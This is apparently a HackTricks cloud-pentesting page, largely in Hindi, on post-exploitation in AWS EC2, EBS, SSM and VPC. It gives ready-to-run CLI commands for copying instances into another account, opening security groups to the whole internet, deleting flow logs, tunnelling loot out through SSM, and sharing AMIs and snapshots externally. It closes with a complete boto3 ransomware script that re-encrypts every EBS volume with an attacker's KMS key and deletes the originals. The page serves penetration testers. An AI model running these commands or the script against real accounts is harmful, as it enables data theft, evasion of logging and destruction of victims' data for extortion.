# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

For more information check:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring VPC के अंदर EC2 instances के inbound और outbound ट्रैफ़िक को duplicate करता है बिना instances पर कुछ install किए बिना। यह duplicated ट्रैफ़िक आमतौर पर analysis और monitoring के लिए किसी network intrusion detection system (IDS) जैसे सिस्टम को भेजा जाता है।\
एक attacker इसका दुरुपयोग करके सभी ट्रैफ़िक को capture कर सकता है और संवेदनशील जानकारी प्राप्त कर सकता है:

For more information check this page:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances में आम तौर पर कुछ न कुछ संवेदनशील जानकारी होती है। अंदर जाने के विभिन्न तरीके हैं (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). हालांकि, यह देखने का एक और तरीका यह है कि **create an AMI and run a new instance (even in your own account) from it**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots volumes के बैकअप होते हैं**, जो आमतौर पर **संवेदनशील जानकारी** रखते हैं, इसलिए इन्हें चेक करने पर यह जानकारी उजागर हो सकती है.\
यदि आप कोई **volume without a snapshot** पाते हैं तो आप कर सकते हैं: **Create a snapshot** और निम्नलिखित क्रियाएँ कर सकते हैं या बस इसे खाते के अंदर किसी **instance** में **mount** करें:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

EC2 AMI को सीधे S3 में `CreateStoreImageTask` का उपयोग करके export करें ताकि snapshot sharing के बिना raw disk image प्राप्त हो सके। इससे instance की networking को बिना छेड़े पूरा offline forensic या data theft संभव होता है।

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

एक io1/io2 Multi-Attach volume को दूसरे instance से attach करें और इसे read-only mount करके बिना snapshots के live data siphon करें। यह तब उपयोगी है जब victim volume पर पहले से ही उसी AZ में Multi-Attach enabled हो।

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

एक EC2 Instance Connect Endpoint बनाएं, ingress authorize करें, और ephemeral SSH keys inject करके managed tunnel के माध्यम से private instances तक पहुँचें। इससे public ports खोले बिना तेज़ lateral movement के रास्ते मिलते हैं।

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

victim ENI के secondary private IP को attacker-controlled ENI पर स्थानांतरित करें ताकि आप IP द्वारा allowlisted विश्वसनीय hosts की impersonation कर सकें। यह specific addresses पर आधारित internal ACLs या SG rules को bypass करने में सक्षम बनाता है।

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

victim instance से Elastic IP को attacker पर reassociate करें ताकि inbound ट्रैफिक intercept किया जा सके या outbound कनेक्शन originate किए जा सकें जो trusted public IPs से आ रहे प्रतीत हों।

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

यदि किसी security group rule में customer-managed prefix list reference है, तो उस list में attacker CIDRs जोड़ने से बिना SG को modify किए ही हर dependent SG rule में चुपचाप access बढ़ जाता है।

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

gateway या interface VPC endpoints बनाकर isolated subnets से outbound access वापस पाया जा सकता है। AWS-managed private links का लाभ उठाकर missing IGW/NAT controls को bypass कर के data exfiltration संभव होता है।

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

ec2:AuthorizeSecurityGroupIngress permission रखने वाला attacker security groups में inbound rules जोड़ सकता है (उदा., 0.0.0.0/0 से tcp:80 allow करना), जिससे internal services सार्वजनिक Internet या अन्यथा unauthorized नेटवर्क्स के लिए exposed हो जाती हैं।
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
ec2:ReplaceNetworkAclEntry (या समान) permissions वाले attacker एक subnet के Network ACLs (NACLs) को बहुत अधिक permissive बना सकते हैं — उदाहरण के लिए critical ports पर 0.0.0.0/0 की अनुमति देकर — जिससे पूरा subnet range Internet या अनधिकृत network segments के लिए exposed हो जाता है। Security Groups के विपरीत, जो per-instance लागू होते हैं, NACLs subnet स्तर पर लागू होते हैं, इसलिए किसी restrictive NACL को बदलने से कई अधिक hosts तक access सक्षम होकर blast radius काफी बढ़ सकता है।
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

एक हमलावर जिसके पास ec2:Delete* और iam:Remove* permissions हैं, महत्वपूर्ण इंफ्रास्ट्रक्चर संसाधनों और कॉन्फ़िगरेशन को डिलीट कर सकता है — उदाहरण के लिए key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups या rules, ENIs/network endpoints, route tables, gateways, या managed endpoints. यह तुरंत सेवा में व्यवधान, डेटा हानि, और फॉरेंसिक सबूतों की हानि का कारण बन सकता है।

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

VPC Flow Logs को attacker-controlled S3 bucket की ओर पॉइंट करें ताकि victim account के बाहर नेटवर्क मेटाडेटा (source/destination, ports) को long-term reconnaissance के लिए लगातार एकत्र किया जा सके।

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

यदि आप EC2 को लॉकडाउन करके बाहर कोई ट्रैफ़िक नहीं होने देते, तब भी यह **exfil via DNS** कर सकता है।

- **VPC Flow Logs will not record this**.
- आपके पास AWS DNS logs तक पहुंच नहीं है।
- Disable this by setting "enableDnsSupport" to false with:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

एक हमलावर अपने नियंत्रित खाते के API endpoints को कॉल कर सकता है। Cloudtrail इन कॉल्स को लॉग करेगा और हमलावर Cloudtrail logs में exfiltrate किए गए डेटा को देख पाएगा।

### Open Security Group

आप इस तरह पोर्ट खोलकर नेटवर्क सेवाओं तक और अधिक पहुँच प्राप्त कर सकते हैं:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc से ECS

यह संभव है कि आप एक EC2 instance चला कर उसे ECS instances चलाने के लिए register कर सकें और फिर ECS instances के डेटा को चुरा सकें।

For [**अधिक जानकारी के लिए देखें**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### VPC flow logs हटाएं
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Required permissions:

- `ssm:StartSession`

कमांड निष्पादन के अलावा, SSM ट्रैफ़िक टनलिंग की अनुमति देता है, जिसे उन EC2 इंस्टेंस से pivot करने के लिए दुरुपयोग किया जा सकता है जिनके पास Security Groups या NACLs के कारण नेटवर्क एक्सेस नहीं है।
एक उपयोगी परिदृश्य यह है कि [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) से एक निजी EKS cluster में pivot करना।

> एक session शुरू करने के लिए आपके पास SessionManagerPlugin इंस्टॉल होना चाहिए: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. अपने मशीन पर SessionManagerPlugin इंस्टॉल करें
2. निम्नलिखित कमांड का उपयोग करके Bastion EC2 में लॉग इन करें:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Bastion EC2 AWS temporary credentials को [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) स्क्रिप्ट के साथ प्राप्त करें
4. अपनी मशीन पर `$HOME/.aws/credentials` फ़ाइल में credentials को `[bastion-ec2]` profile के रूप में स्थानांतरित करें
5. Bastion EC2 के रूप में EKS में लॉग इन करें:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` फ़ाइल में `server` फ़ील्ड को `https://localhost` की ओर अपडेट करें
7. निम्नानुसार एक SSM tunnel बनाएँ:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` टूल से ट्रैफ़िक अब SSM टनल के माध्यम से Bastion EC2 के ज़रिए फॉरवर्ड हो रहा है और आप अपनी मशीन से निम्नलिखित कमांड चलाकर निजी EKS क्लस्टर तक पहुँच सकते हैं:
```shell
kubectl get pods --insecure-skip-tls-verify
```
ध्यान दें कि SSL कनेक्शन्स तब तक फेल हो जाएँगे जब तक आप `--insecure-skip-tls-verify ` फ्लैग (या K8s audit tools में इसका समकक्ष) सेट नहीं करते। चूँकि ट्रैफ़िक सुरक्षित AWS SSM टनल के माध्यम से टनल किया जाता है, आप किसी भी प्रकार के MitM हमले से सुरक्षित हैं।

अंततः, यह तकनीक निजी EKS क्लस्टर्स पर हमले तक सीमित नहीं है। आप मनमाने domains और ports सेट करके किसी भी अन्य AWS सेवा या किसी कस्टम एप्लिकेशन की ओर pivot कर सकते हैं।

---

#### त्वरित लोकल ↔️ रिमोट पोर्ट फॉरवर्ड (AWS-StartPortForwardingSession)

यदि आपको केवल EC2 instance से अपने local host पर **एक TCP पोर्ट फॉरवर्ड** करने की आवश्यकता है, तो आप `AWS-StartPortForwardingSession` SSM document का उपयोग कर सकते हैं (कोई remote host parameter आवश्यक नहीं):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **without opening any inbound Security-Group rules**.

Common use cases:

* **File exfiltration**
1. instance पर उस डायरेक्टरी की ओर संकेत करते हुए एक त्वरित HTTP server शुरू करें जिसे आप exfiltrate करना चाहते हैं:

```bash
python3 -m http.server 8000
```

2. अपने workstation से SSM tunnel के माध्यम से फाइलें प्राप्त करें:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **आंतरिक वेब एप्लिकेशन तक पहुँच (उदा., Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
टिप: exfiltrating करने से पहले सबूत को Compress और encrypt कर लें ताकि CloudTrail clear-text content को लॉग न करे:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### AMI साझा करें
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### public और private AMIs में संवेदनशील जानकारी खोजें

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel एक ऐसा टूल है जो **public या private Amazon Machine Images (AMIs) के भीतर संवेदनशील जानकारी खोजने** के लिए बनाया गया है। यह target AMIs से instances लॉन्च करने, उनके volumes को mount करने, और संभावित secrets या संवेदनशील डेटा के लिए स्कैन करने की प्रक्रिया को स्वचालित करता है।

### EBS Snapshot साझा करें
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

यह proof of concept S3 post-exploitation notes में दिखाए गए Ransomware demonstration के समान है। KMS को इसके उपयोग की आसानी को देखते हुए Ransomware Management Service यानी RMS कहा जाना चाहिए, क्योंकि इसका इस्तेमाल विभिन्न AWS सेवाओं को encrypt करने के लिए करना कितना आसान है।

सबसे पहले 'attacker' AWS account से, KMS में एक customer managed key बनाएं। इस उदाहरण के लिए हम बस AWS को मेरे लिए key data manage करने देंगे, लेकिन वास्तविक परिदृश्य में एक malicious actor key data को AWS के नियंत्रण के बाहर रखेगा। key policy को बदलकर किसी भी AWS account Principal को इस key का उपयोग करने की अनुमति दें। इस key policy के लिए खाते का नाम 'AttackSim' था और सभी एक्सेस की अनुमति देने वाला policy rule 'Outside Encryption' कहा जाता है।
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Similar to the S3 ransomware example. This attack will create copies of the attached EBS volumes using snapshots, use the publicly available key from the 'attacker' account to encrypt the new EBS volumes, then detach the original EBS volumes from the EC2 instances and delete them, and then finally delete the snapshots used to create the newly encrypted EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

This results in only encrypted EBS volumes left available in the account.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Also worth noting, the script stopped the EC2 instances to detach and delete the original EBS volumes. The original unencrypted volumes are gone now.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Next, return to the key policy in the 'attacker' account and remove the 'Outside Encryption' policy rule from the key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
नए सेट किए गए key policy के फैलने तक थोड़ी देर इंतज़ार करें। फिर 'victim' अकाउंट में लौटें और नई encrypted EBS volumes में से किसी एक को attach करने का प्रयास करें। आप पाएँगे कि आप volume को attach कर सकते हैं।

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

लेकिन जब आप encrypted EBS volume के साथ EC2 instance को वास्तव में फिर से start करने की कोशिश करेंगे, तो यह विफल होगा और 'pending' स्थिति से वापस 'stopped' स्थिति में चला जाएगा, क्योंकि attached EBS volume को key से decrypt नहीं किया जा सकता — key policy अब इसकी अनुमति नहीं देती।

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

यह उपयोग किया गया python script है। यह 'victim' अकाउंट के लिए AWS creds और encryption के लिए उपयोग किए जाने वाले key के लिए एक सार्वजनिक रूप से उपलब्ध AWS ARN वैल्यू लेता है। स्क्रिप्ट लक्षित AWS अकाउंट में मौजूद सभी EC2 instances पर जुड़े सभी उपलब्ध EBS volumes की encrypted कॉपियाँ बनाएगी, फिर हर EC2 instance को stop करेगी, मूल EBS volumes को detach करेगी, उन्हें delete करेगी और अंत में प्रक्रिया के दौरान उपयोग किए गए सभी snapshots को भी delete कर देगी। इससे लक्षित 'victim' अकाउंट में केवल encrypted EBS volumes ही शेष रहेंगे। केवल इस script का उपयोग TEST ENVIRONMENT में ही करें — यह destructive है और सभी original EBS volumes को delete कर देगा। आप इन्हें उपयोग किए गए KMS key के साथ recover कर सकते हैं और snapshots के माध्यम से इन्हें उनकी original स्थिति में restore कर सकते हैं, पर ध्यान रखें कि अंततः यह एक ransomware PoC है।
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## संदर्भ

- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
